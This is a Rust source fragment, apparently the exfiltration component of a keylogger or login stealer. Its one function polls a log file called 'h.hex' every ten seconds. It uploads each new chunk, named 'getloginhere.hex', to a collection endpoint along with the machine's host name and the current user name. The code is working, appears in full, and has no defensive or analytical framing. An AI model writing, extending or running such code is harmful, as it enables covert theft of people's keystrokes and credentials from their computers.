fn upload_file() {
    let mut last_offset: u64 = 0;
    loop {
        sleep(Duration::from_secs(10));
        let current_file_size = get_file_size("h.hex");

        if current_file_size < last_offset {
            // File has been truncated or replaced
            println!("File has been deleted and a replacement has been created!");
            last_offset = 0;
        } else if current_file_size > last_offset {
            // File size increased, new content available
            let url = "http://127.0.0.1:8082/UploadFile";

            let mut file = File::open("h.hex").expect("Failed to open file");
            let mut content = Vec::new();

            // Seek to the last offset
            file.seek(SeekFrom::Start(last_offset)).expect("Failed to seek file");

            // Read new content from the file
            file.read_to_end(&mut content).expect("Failed to read file");

            let json_data = json!({
                "MachineName": get_host_name(),
                "Username": get_current_user()
            });

            let client = reqwest::blocking::Client::new();

            let form = multipart::Form::new()
                .part(
                    "file",
                    Part::bytes(content)
                        .file_name("getloginhere.hex")
                        .mime_str("application/octet-stream")
                        .unwrap(),
                )
                .part(
                    "json_data",
                    Part::text(serde_json::to_string(&json_data).unwrap())
                        .mime_str("application/json")
                        .unwrap(),
                );

            if let Ok(res) = client.post(url).multipart(form).send() {
                println!("Response: {:?}", res);
                // Update the last offset to the current file size
                last_offset = current_file_size;
            } else {
                eprintln!("Failed to send request");
            }
        }
    }
}